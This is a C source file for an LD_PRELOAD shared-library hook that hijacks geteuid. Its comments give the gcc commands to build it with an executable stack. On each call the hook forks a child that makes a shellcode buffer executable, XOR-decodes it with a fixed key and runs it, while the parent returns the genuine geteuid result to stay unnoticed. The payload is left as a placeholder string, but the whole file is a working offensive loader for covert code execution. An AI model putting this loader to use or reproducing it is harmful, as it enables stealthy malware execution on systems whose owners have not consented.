#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>   

// Compile with the following commands:
//  gcc -Wall -fPIC -z execstack -c -o hook.o hook.c                                        
//  gcc -shared -o hook.so hook.o -ldl -z execstack   
 

unsigned char buf[] = "SHELLCODE_HERE"; 

uid_t geteuid(void) {
    // Save a pointer to the real geteuid function
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
    // Start a child process for running the shellcode
    if (fork()==0) {
        // Set memory protections to make it readable, writable (so it can be decrypted), and executable
        intptr_t pagesize=sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_WRITE|PROT_EXEC)) {
            perror("mprotect");
            return -1;
        }
        // Decrypt each byte in the shellcode buffer by XORing it with 0x39
        char xor_key = '9';
        int payload_length = (int) sizeof(buf);
        for (int i=0; i < payload_length; i++) {
            buf[i] = buf[i]^xor_key;
        }
        // Cast the shellcode buffer to a function pointer
        int (*ret)() = (int(*)())buf;
        ret();
    }
    // Run the real geteuid function
    else {
        return (*old_geteuid)();
    }
    return -2;
}
